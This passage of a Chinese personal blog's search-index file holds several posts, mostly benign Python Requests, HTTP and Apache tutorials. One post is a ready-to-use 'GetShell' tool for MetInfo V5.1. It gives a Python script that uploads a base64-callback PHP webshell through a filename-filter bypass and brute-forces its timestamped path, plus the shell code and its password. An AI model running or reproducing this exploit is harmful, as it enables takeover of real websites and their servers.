r.status_code204&gt;&gt;&gt; r.headers['status']'204 No Content' 很好。不见了。最后一件我想知道的事情是我已经使用了多少限额（ratelimit）。查查看，GitHub在响应头部发送这个信息， 因此不必下载整个网页，我将使用一个HEAD请求来获取响应头。 123456&gt;&gt;&gt; r = requests.head(url=url, auth=auth)&gt;&gt;&gt; print r.headers...'x-ratelimit-remaining': '4995''x-ratelimit-limit': '5000'... 很好。是时候写个Python程序以各种刺激的方式滥用GitHub的API，还可以使用4995次呢。 响应头链接字段 许多HTTP API都有响应头链接字段的特性，它们使得API能够更好地自我描述和自我显露。 GitHub在API中为 分页 使用这些特性，例如: 1234&gt;&gt;&gt; url = 'https://api.github.com/users/kennethreitz/repos?page=1&amp;per_page=10'&gt;&gt;&gt; r = requests.head(url=url)&gt;&gt;&gt; r.headers['link']'&lt;https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10&gt;; rel="next", &lt;https://api.github.com/users/kennethreitz/repos?page=6&amp;per_page=10&gt;; rel="last"' Requests会自动解析这些响应头链接字段，并使得它们非常易于使用: 12345&gt;&gt;&gt; r.links["next"]&#123;'url': 'https://api.github.com/users/kennethreitz/repos?page=2&amp;per_page=10', 'rel': 'next'&#125;&gt;&gt;&gt; r.links["last"]&#123;'url': 'https://api.github.com/users/kennethreitz/repos?page=7&amp;per_page=10', 'rel': 'last'&#125; Transport Adapters As of v1.0.0, Requests has moved to a modular internal design. Part of the reason this was done was to implement Transport Adapters, originally described here. Transport Adapters provide a mechanism to define interaction methods for an HTTP service. In particular, they allow you to apply per-service configuration. Requests ships with a single Transport Adapter, the HTTPAdapter. This adapter provides the default Requests interaction with HTTP and HTTPS using the powerful urllib3 library. Whenever a Requests Session is initialized, one of these is attached to the Session object for HTTP, and one for HTTPS. Requests enables users to create and use their own Transport Adapters that provide specific functionality. Once created, a Transport Adapter can be mounted to a Session object, along with an indication of which web services it should apply to. 12&gt;&gt;&gt; s = requests.Session()&gt;&gt;&gt; s.mount('http://www.github.com', MyAdapter()) The mount call registers a specific instance of a Transport Adapter to a prefix. Once mounted, any HTTP request made using that session whose URL starts with the given prefix will use the given Transport Adapter. Many of the details of implementing a Transport Adapter are beyond the scope of this documentation, but take a look at the next example for a simple SSL use- case. For more than that, you might look at subclassing requests.adapters.BaseAdapter. Example: Specific SSL VersionThe Requests team has made a specific choice to use whatever SSL version is default in the underlying library (urllib3). Normally this is fine, but from time to time, you might find yourself needing to connect to a service-endpoint that uses a version that isn’t compatible with the default. You can use Transport Adapters for this by taking most of the existing implementation of HTTPAdapter, and adding a parameter ssl_version that gets passed-through to urllib3. We’ll make a TA that instructs the library to use SSLv3: 1234567891011121314import sslfrom requests.adapters import HTTPAdapterfrom requests.packages.urllib3.poolmanager import PoolManagerclass Ssl3HttpAdapter(HTTPAdapter): """"Transport adapter" that allows us to use SSLv3.""" def init_poolmanager(self, connections, maxsize, block=False): self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, ssl_version=ssl.PROTOCOL_SSLv3) Blocking Or Non-Blocking? With the default Transport Adapter in place, Requests does not provide any kind of non-blocking IO. The Response.content property will block until the entire response has been downloaded. If you require more granularity, the streaming features of the library (see 流式请求) allow you to retrieve smaller quantities of the response at a time. However, these calls will still block. If you are concerned about the use of blocking IO, there are lots of projects out there that combine Requests with one of Python’s asynchronicity frameworks. Two excellent examples are grequests and requests-futures. Timeouts Most requests to external servers should have a timeout attached, in case the server is not responding in a timely manner. Without a timeout, your code may hang for minutes or more. The connect timeout is the number of seconds Requests will wait for your client to establish a connection to a remote machine (corresponding to the connect()) call on the socket. It’s a good practice to set connect timeouts to slightly larger than a multiple of 3, which is the default TCP packet retransmission window. Once your client has connected to the server and sent the HTTP request, the read timeout is the number of seconds the client will wait for the server to send a response. (Specifically, it’s the number of seconds that the client will wait between bytes sent from the server. In 99.9% of cases, this is the time before the server sends the first byte). If you specify a single value for the timeout, like this: 1r = requests.get('https://github.com', timeout=5) The timeout value will be applied to both the connect and the read timeouts. Specify a tuple if you would like to set the values separately: 1r = requests.get('https://github.com', timeout=(3.05, 27)) If the remote server is very slow, you can tell Requests to wait forever for a response, by passing None as a timeout value and then retrieving a cup of coffee. 1r = requests.get('https://github.com', timeout=None) CA Certificates By default Requests bundles a set of root CAs that it trusts, sourced from the Mozilla trust store. However, these are only updated once for each Requests version. This means that if you pin a Requests version your certificates can become extremely out of date. From Requests version 2.4.0 onwards, Requests will attempt to use certificates from certifi if it is present on the system. This allows for users to update their trusted certificates without having to change the code that runs on their system. For the sake of security we recommend upgrading certifi frequently! 说明：前面有些官方文档没翻译到的，我自己翻译了，后一部分，时间太晚了，是在没精力了，以后有时间再翻译，可能我翻译的有些语句不通顺，但是还是能大概表达出意思的，如果你对比了官方文档，觉得你可以翻译得更好，可以私信或留言我哦 想喷我的人也省省吧，的确，这篇文章和之前的一篇Requests安装使用都是我从官网移植过来的，但是我花时间翻译了一部分，排版也废了番功夫，使用MarkDown写成，需要源md文档也可以找我索要，本文随意传播 我是Akkuman，同道人可以和我一起交流哦，私信或留言均可,我的博客hacktech.cn | 53xiaoshuo.com]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTTP协议请求类型介绍]]></title>
      <url>%2F2016%2F06%2F10%2FHTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E7%B1%BB%E5%9E%8B%E4%BB%8B%E7%BB%8D.html</url>
      <content type="text"><![CDATA[HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下： OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。 HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET：向特定的资源发出请求。 POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除Request-URI所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 虽然HTTP的请求方式有8种，但是我们在实际应用中常用的也就是get和post，其他请求方式也都可以通过这两种方式间接的来实现。 转载自：http://www.xuebuyuan.com/1586750.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python中的open和codecs.open]]></title>
      <url>%2F2016%2F06%2F10%2FPython%E4%B8%AD%E7%9A%84open%E5%92%8Ccodecs-open.html</url>
      <content type="text"><![CDATA[最近老被编码困扰，多次折腾之后，感觉python的编解码做得挺好的，只要了解下边的流程，一般都能解决 input文件(gbk, utf-8…) —-decode—–&gt; unicode ——-encode——&gt; output文件(gbk, utf-8…)很多文本挖掘的package是在unicode上边做事的，比如nltk. 所以开始读入文件后要decode为unicode格式，可以通过下边两步：12f=open('XXXXX', 'r')content=f.read().decode('utf-8') 更好的方法是使用codecs.open读入时直接解码：12f=codecs.open(XXX, encoding='utf-8')content=f.read() 转自: http://f.dataguru.cn/thread-237116-1-1.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python之Requests的安装与基本使用]]></title>
      <url>%2F2016%2F06%2F09%2FPython%E4%B9%8BRequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html</url>
      <content type="text"><![CDATA[安装 使用 pip 安装Requests非常简单1pip install requests 或者使用 easy_install 安装1easy_install requests 获得源码 Requests 一直在Github上被积极的开发着 你可以克隆公共版本库: 1git clone git://github.com/kennethreitz/requests.git 下载 源码: 1curl -OL https://github.com/kennethreitz/requests/tarball/master 或者下载 zipball: 1curl -OL https://github.com/kennethreitz/requests/zipball/master 一旦你获得了复本，你就可以轻松的将它嵌入到你的python包里或者安装到你的site-packages: 1python setup.py install 快速上手 发送请求 使用Requests发送网络请求非常简单。 一开始要导入Requests模块: 1&gt;&gt;&gt; import requests 然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线 1&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json') 现在，我们有一个名为 r 的 Response 对象。可以从这个对象中获取所有我们想要的信息。 Requests简便的API意味着所有HTTP请求类型都是显而易见的。例如，你可以这样发送一个HTTP POST请求: 1&gt;&gt;&gt; r = requests.post("http://httpbin.org/post") 漂亮，对吧？那么其他HTTP请求类型：PUT， DELETE， HEAD以及OPTIONS又是如何的呢？都是一样的简单: 1234&gt;&gt;&gt; r = requests.put("http://httpbin.org/put")&gt;&gt;&gt; r = requests.delete("http://httpbin.org/delete")&gt;&gt;&gt; r = requests.head("http://httpbin.org/get")&gt;&gt;&gt; r = requests.options("http://httpbin.org/get") 都很不错吧，但这也仅是Requests的冰山一角呢。 为URL传递参数 你也许经常想为URL的查询字符串(query string)传递某种数据。如果你是手工构建URL，那么数据会以键/值 对的形式置于URL中，跟在一个问号的后面。例如， httpbin.org/get?key=val 。 Requests允许你使用 params 关键字参数，以一个字典来提供这些参数。举例来说，如果你想传递 key1=value1 和 key2=value2 到 httpbin.org/get ，那么你可以使用如下代码: 12&gt;&gt;&gt; payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;&gt;&gt;&gt; r = requests.get("http://httpbin.org/get", params=payload) 通过打印输出该URL，你能看到URL已被正确编码: 12&gt;&gt;&gt; print(r.url)http://httpbin.org/get?key2=value2&amp;key1=value1 注意字典里值为 None 的键都不会被添加到 URL 的查询字符串里。 响应内容 我们能读取服务器响应的内容。再次以Github时间线为例: 1234&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json')&gt;&gt;&gt; r.textu'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/... Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。 请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问 r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它: 123&gt;&gt;&gt; r.encoding'utf-8'&gt;&gt;&gt; r.encoding = 'ISO-8859-1' 如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。你可能希望在使用特殊逻辑计算出文本的编码的情况下来修改编码。比如 HTTP 和 XML 自身可以指定编码。这样的话，你应该使用 r.content 来找到编码，然后设置 r.encoding 为相应的编码。这样就能使用正确的编码解析 r.text 了。 在你需要的情况下，Requests也可以使用定制的编码。如果你创建了自己的编码，并使用 codecs 模块进行注册，你就可以轻松地使用这个解码器名称作为 r.encoding 的值， 然后由Requests来为你处理编码。 二进制响应内容 你也能以字节的方式访问请求响应体，对于非文本请求: 12&gt;&gt;&gt; r.contentb'[&#123;"repository":&#123;"open_issues":0,"url":"https://github.com/... Requests会自动为你解码 gzip 和 deflate 传输编码的响应数据。 例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码: 123&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; from StringIO import StringIO&gt;&gt;&gt; i = Image.open(StringIO(r.content)) JSON响应内容 Requests中也有一个内置的JSON解码器，助你处理JSON数据: 1234&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json')&gt;&gt;&gt; r.json()[&#123;u'repository': &#123;u'open_issues': 0, u'url': 'https://github.com/... 如果JSON解码失败， r.json 就会抛出一个异常。例如，相应内容是 401 (Unauthorized) ，尝试访问 r.json 将会抛出 ValueError: No JSON object could be decoded 异常。 原始响应内容 在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True 。具体的你可以这么做: 12345&gt;&gt;&gt; r = requests.get('https://github.com/timeline.json', stream=True)&gt;&gt;&gt; r.raw&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;&gt;&gt;&gt; r.raw.read(10)'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03' 但一般情况下，你应该以下面的模式将文本流保存到文件: 123with open(filename, 'wb') as fd: for chunk in r.iter_content(chunk_size): fd.write(chunk) 使用 Response.iter_content 将会处理大量你直接使用 Response.raw 不得不处理的。 当流下载时，上面是优先推荐的获取内容方式。 定制请求头 如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。 例如，在前一个示例中我们没有指定content-type: 123456&gt;&gt;&gt; import json&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; headers = &#123;'content-type': 'application/json'&#125;&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload), headers=headers) 更加复杂的POST请求 通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 data 参数。你的数据字典 在发出请求时会自动编码为表单形式: 1234567891011&gt;&gt;&gt; payload = &#123;'key1': 'value1', 'key2': 'value2'&#125;&gt;&gt;&gt; r = requests.post("http://httpbin.org/post", data=payload)&gt;&gt;&gt; print r.text&#123; ... "form": &#123; "key2": "value2", "key1": "value1" &#125;, ...&#125; 很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。 例如，Github API v3接受编码为JSON的POST/PATCH数据: 12345&gt;&gt;&gt; import json&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'&gt;&gt;&gt; payload = &#123;'some': 'data'&#125;&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload)) POST一个多部分编码(Multipart-Encoded)的文件 Requests使得上传多部分编码文件变得很简单: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': open('report.xls', 'rb')&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "&lt;censored...binary...data&gt;" &#125;, ...&#125; 你可以显式地设置文件名，文件类型和请求头: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': ('report.xls', open('report.xls', 'rb'), 'application/vnd.ms-excel', &#123;'Expires': '0'&#125;)&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "&lt;censored...binary...data&gt;" &#125;, ...&#125; 如果你想，你也可以发送作为文件来接收的字符串: 123456789101112&gt;&gt;&gt; url = 'http://httpbin.org/post'&gt;&gt;&gt; files = &#123;'file': ('report.csv', 'some,data,to,send\nanother,row,to,send\n')&#125;&gt;&gt;&gt; r = requests.post(url, files=files)&gt;&gt;&gt; r.text&#123; ... "files": &#123; "file": "some,data,to,send\\nanother,row,to,send\\n" &#125;, ...&#125; 如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。 在一个请求中发送多文件参考 高级用法 一节. 响应状态码 我们可以检测响应状态码: 123&gt;&gt;&gt; r = requests.get('http://httpbin.org/get')&gt;&gt;&gt; r.status_code200 为方便引用，Requests还附带了一个内置的状态码查询对象: 12&gt;&gt;&gt; r.status_code == requests.codes.okTrue 如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常: 123456789&gt;&gt;&gt; bad_r = requests.get('http://httpbin.org/status/404')&gt;&gt;&gt; bad_r.status_code404&gt;&gt;&gt; bad_r.raise_for_status()Traceback (most recent call last): File "requests/models.py", line 832, in raise_for_status raise http_errorrequests.exceptions.HTTPError: 404 Client Error 但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是: 12&gt;&gt;&gt; r.raise_for_status()None 一切都挺和谐哈。 响应头 我们可以查看以一个Python字典形式展示的服务器响应头: 12345678910&gt;&gt;&gt; r.headers&#123; 'content-encoding': 'gzip', 'transfer-encoding': 'chunked', 'connection': 'close', 'server': 'nginx/1.0.4', 'x-runtime': '148ms', 'etag': '"e1ca502697e5c9317743dc078f67693f"', 'content-type': 'application/json'&#125; 但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。 因此，我们可以使用任意大写形式来访问这些响应头字段: 12345&gt;&gt;&gt; r.headers['Content-Type']'application/json'&gt;&gt;&gt; r.headers.get('content-type')'application/json' Cookies 如果某个响应中包含一些Cookie，你可以快速访问它们: 12345&gt;&gt;&gt; url = 'http://example.com/some/cookie/setting/url'&gt;&gt;&gt; r = requests.get(url)&gt;&gt;&gt; r.cookies['example_cookie_name']'example_cookie_value' 要想发送你的cookies到服务器，可以使用 cookies 参数: 123456&gt;&gt;&gt; url = 'http://httpbin.org/cookies'&gt;&gt;&gt; cookies = dict(cookies_are='working')&gt;&gt;&gt; r = requests.get(url, cookies=cookies)&gt;&gt;&gt; r.text'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;' 重定向与请求历史 默认情况下，除了 HEAD, Requests会自动处理所有重定向。 可以使用响应对象的 history 方法来追踪重定向。 Response.history 是一个:class:Response&lt;requests.Response&gt; 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。 例如，Github将所有的HTTP请求重定向到HTTPS。: 1234567&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)&gt;&gt;&gt; r.url&apos;https://github.com/&apos;&gt;&gt;&gt; r.status_code200&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理: 12345&gt;&gt;&gt; r = requests.get('http://github.com', allow_redirects=False)&gt;&gt;&gt; r.status_code301&gt;&gt;&gt; r.history[] 如果你使用的是HEAD，你也可以启用重定向: 12345&gt;&gt;&gt; r = requests.head('http://github.com', allow_redirects=True)&gt;&gt;&gt; r.url'https://github.com/'&gt;&gt;&gt; r.history[&lt;Response [301]&gt;] 超时 你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应: 12345&gt;&gt;&gt; requests.get('http://github.com', timeout=0.001)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;requests.exceptions.Timeout: HTTPConnectionPool(host='github.com', port=80): Request timed out. (timeout=0.001) 注::timeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在timeout秒内没有应答，将会引发一个异常（更精确地说，是在timeout秒内没有从基础套接字上接收到任何字节的数据时） 错误与异常 遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 ConnectionError 异常。 遇到罕见的无效HTTP响应时，Requests则会抛出一个 HTTPError 异常。 若请求超时，则抛出一个 Timeout 异常。 若请求超过了设定的最大重定向次数，则会抛出一个 TooManyRedirects 异常。 所有Requests显式抛出的异常都继承自 requests.exceptions.RequestException 。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[编码转换工具]]></title>
      <url>%2F2016%2F06%2F09%2F%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[闲来无事，写了款编码转换工具 以我的审美来看，界面应该算美丽 截图 : 下载地址：编码转换工具 转载请注明出处 作者博客 53xiaoshou.com | hacktech.cn]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MetInfo V5.1 GetShell一键化工具]]></title>
      <url>%2F2016%2F06%2F08%2FMetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html</url>
      <content type="text"><![CDATA[漏洞解析： config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&gt;get_one("SELECT * FROM $met_lang WHERE lang='$lang'");if(!$langoks)die('No data in the database,please reinstall.');if(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo('../404.html');if(count($met_langok)==1)$lang=$met_index_type;$query = "SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'";//看这里$result = $db-&gt;query($query);while($list_config= $db-&gt;fetch_array($result))&#123; if($metinfoadminok)$list_config['value']=str_replace('"', '&amp;#34;', str_replace("'", '&amp;#39;',$list_config['value'])); $settings_arr[]=$list_config; if($list_config['columnid'])&#123; $settings[$list_config['name'].'_'.$list_config['columnid']]=$list_config['value']; &#125;else&#123; $settings[$list_config['name']]=$list_config['value']; &#125;&#125;@extract($settings); 访问 http:///localhost/metinfo5.1/index.php?lang=metinfo SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39; 文件命名方式： /feedback/uploadfile_save.php1234567srand((double)microtime() * 1000000);$rnd = rand(100, 999);$name = date('U') + $rnd;$name = $name.".".$ext; 文件保存在/upload/file/目录 命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数 可爆破： 如 http://127.0.0.1/upload/file/1465394396.php 一键化利用工具： 本程序基于python编写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#!/usr/bin/env python#-*- coding: utf-8 -*-import requestsimport Queueimport threadingimport timeimport sysheaders = &#123;'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'&#125;urls = Queue.Queue()#http://hb.jhxjd.com/upload/file/1441445378.phpdef bp(urls,time_out): while not urls.empty(): base_url = urls.get() response = None try: time.sleep(int(time_out))#延时设置 response = requests.get(base_url,headers=headers) if response.status_code == 404: print 'Not Fount----%s\n' % base_url except: continue finally: if response: with open('url.txt','a+') as f: f.write('%s?e=YXNzZXJ0\n'%base_url)def main(target_url,thread_num,time_out): #取出当前时间戳并删除后四位 now = str(int(time.time()))[:-4] #将所有的待爆破地址遍历并加入队列 for i in range(0,10): for j in range(100,1000): num_str = ''.join((str(i),str(j))) url = ''.join(('%s/upload/file/%s' % (target_url,now),num_str,'.php')) urls.put(url) #上传文件 with open('xiaoma.php','w+') as fi: fi.write("&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;") data = &#123; 'fd_para[1][para]':'filea', 'fd_para[1][type]':'5' &#125; files = &#123;'filea': open("xiaoma.php", 'rb')&#125; upload_url = '%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo' % target_url res = requests.post(upload_url,data = data,files=files) #等待两秒 文件上传 time.sleep(2) #启动多线程 for i in range(int(thread_num)): t = threading.Thread(target = bp,args=(urls,time_out,)) t.start()if __name__ == '__main__': if len(sys.argv) != 4: print 'Example : %s http://www.xxx.com 20 0' % sys.argv[0] else: main(sys.argv[1],sys.argv[2],sys.argv[3]) 程序略显粗糙 为了方便，我也把他打包成了exe 然后闲着没事，想着简单地给他做了个界面,这样的 文件说明 MetInfo V5.1上传漏洞getshell利用工具 作者 : Akkuman 漏洞原理详见http://www.wooyun.org/bugs/wooyun-2010-0139168 使用说明：本目录有两个文件，一个py，一个exe因为exe是py文件打包而成，故文件较大64位系统测试使用通过 如果你安装了py2.x环境 py文件使用方法打开cmdpython baopo.py http://www.xxx.com 20 020是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定 exe命令行文件使用方法打开cmdbaopo.exe http://www.xxx.com 20 020是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定 GUI程序，应该不用说 关于getshell与结果上传的是回调一句话木马12&gt;&lt;?php &gt;$e=$_REQUEST['e'];register_shutdown_function(base64_decode($e),$_&gt;REQUEST['Akkuman']);?&gt;&gt; 菜刀连接，密码是Akkuman 爆破结果会生成在url.txt 下载地址： (访问码:1475) 转载请注明出处 作者博客 hacktech.cn | 53xiaoshuo.com]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder]]></title>
      <url>%2F2016%2F05%2F31%2FDZ%E4%B8%8D%E8%83%BD%E4%B8%8A%E4%BC%A0%E5%A4%B4%E5%83%8F%E6%8F%90%E7%A4%BA%E4%B8%8D%E8%83%BD%E5%86%99%E5%85%A5data-tmp%E7%9B%AE%E5%BD%95.html</url>
      <content type="text"><![CDATA[discuz 不能上传头像提示can not write to the data/tmp folder 解释：disucz头像上传不成功，提示data/tmp目录没有写入权限，这里的data/tmp是网站根目录uc_server/data/tmp这个目录，而不是根目录/data/tmp目录，其实/data下面本来没有tmp目录。 解决办法：首先看看uc_server/data/tmp有无写入权限，如果有权限那么就按照如下解决方法，需要修改php.ini，找到open_basedir选项，行首加分号;注销即可。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Many Website Of WallPaper]]></title>
      <url>%2F2016%2F05%2F31%2FMany%20Website%20Of%20WallPaper.html</url>
      <content type="text"><![CDATA[我在这里给大家推荐几个不错的壁纸网站 毕竟一张赏心悦目的壁纸能让你的工作效率提高不少 注意前方高能 一大波网站即将来袭 一系列 如你所见 alphacoders wallpaperdj Wallhaven(推荐) wallpaperswa eweb4 wallls topwallpapers wallpaperfo wallpapermay picstopin wallpaperup wall321 wallsave wallpaperswide desktopnexus goodfon vladstudio(推荐) simpledesktops(极简) interfacelift kuvva switch-box gde-fon bingimages wallpaper4k(推荐) feelgrafix facets(元素块构图) justinmaller(略抽象) 7-themes superhd fondos7 forwallpaper(推荐) 大B站的动漫壁纸，二次元可选 就推荐到这里吧，基本上是搜刮别人的答案而来，自己都有看过]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[lamp服务器被人恶意绑定域名的解决办法]]></title>
      <url>%2F2016%2F05%2F28%2Flamp%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BA%BA%E6%81%B6%E6%84%8F%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95.html</url>
      <content type="text"><![CDATA[还没开始就被别人绑定了域名事情的起因与发现刚买了个服务器搭建了一个dz，想着域名还没备案，就先搭建了起来，然后在做DDOS测试时偶然发现服务器被别人恶意把域名绑定了 最初的解决方案没管。。。。。。后来发现有影响，朋友也一直给我说叫我整下 利用重定向把恶意指向过来的域名指到别处要利用301重定向，首先我们要在Apache上配置一下，Apache默认是不开启.htaccess的 0x01.编辑httpd.conf文件打开/etc/httpd/conf目录下的httpd.conf文件，找到这一行：1LoadModule rewrite_module modules/mod_rewrite.so 当然，你得确定你的/etc/httpd/modules下有mod_rewrite.so这个文件12&gt; ls /etc/httpd/modules | grep mod_rewrite&gt; 如果你没有找到这一行，记得在httpd.conf文件里直接添加这一行 0x02.设置AllowOverride同样的在httpd.conf文件中找到：123456789101112131415161718192021222324252627&lt;Directory "/var/www/html"&gt; # # Possible values for the Options directive are "None", "All", # or any combination of: # Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews # # Note that "MultiViews" must be named *explicitly* --- "Options All" # doesn't give it to you. # # The Options directive is both complicated and important. Please see # http://httpd.apache.org/docs/2.4/mod/core.html#options # for more information. # Options Indexes FollowSymLinks # # AllowOverride controls what directives may be placed in .htaccess files. # It can be "All", "None", or any combination of the keywords: # Options FileInfo AuthConfig Limit # AllowOverride All # # Controls who can get stuff from this server. # Require all granted&lt;/Directory&gt; 或者它长这个样子：1234&lt;Directory /&gt;Options FollowSymLinksAllowOverride None&lt;/Directory&gt; 什么，你告诉我还是找不到？？？那教你一个办法锁定关键词FollowSymLinks和AllowOverride None vi的向下查找命令是:/你要查找的vi的向上查找命令是:?你要查找的n是下一个N是上一个 相信你已经找到了接下来把None改成All 0x03.编写规则文件.htaccess跑去网站根目录下，比如我的是/var/www/html如果存在.htaccess，忽略下一步，直接打开编辑然后新建.htaccess文件touch .htaccess编辑.htaccess文件vi .htaccess添加如下规则1234RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]RewriteCond %&#123;HTTP_HOST&#125; ^www.别人的域名.com$RewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L] 个人的修改我知道，你在网上所找到的方法都是上面那种代码，并且应该都没有提 教你怎么开启.htaccess但是本人实验过，这配置进去还有问题，设置重启Apache后，访问网站提示500错误机智的我总要查看日志啊1cat /var/log/messages | grep httpd 找到了错误英语不太好，但是大致知道是服务器没有限定域名，需要修改ServerName,而ServerName字段值在httpd.conf中是被注释掉的我们在httpd.conf修改它1#ServerName: www.example.com:80 改为1ServerName: 115.**.**.57:80 然后重启Apache，可以访问了 后续好的故事都会有后续的 以为这样就万事大吉了? 但是我这个被坑得不轻admin.xx.com都被他解析到我服务器上来了 老衲怎么破.htaccess好像可以用正则表达式，一查，果然那就改一下.htaccess咯1234RewriteEngine onRewriteCond %&#123;HTTP_HOST&#125; ^别人的域名.com$ [OR]RewriteCond %&#123;HTTP_HOST&#125; ^.*.别人的域名.com$RewriteRule ^(.*)$ http://www.自己的域名.com/$1 [R=301,L] 机智的你已经发现第三行中的www被我改成了.，就是匹配0个或者多个字符，当然你可以改成+ 然后重启Apache 1systemctl restart httpd 或者1service httpd restart 现在我再访问。。。嘿嘿嘿，被我跳转到百度了 思考当然，还有其他的方法，自己也可以去网上找找对了，那个刚才在httpd.conf里换ip的地方也可换自己的域名，因为我的还在备案，就没改]]></content>
    </entry>

    
  
  
</search>
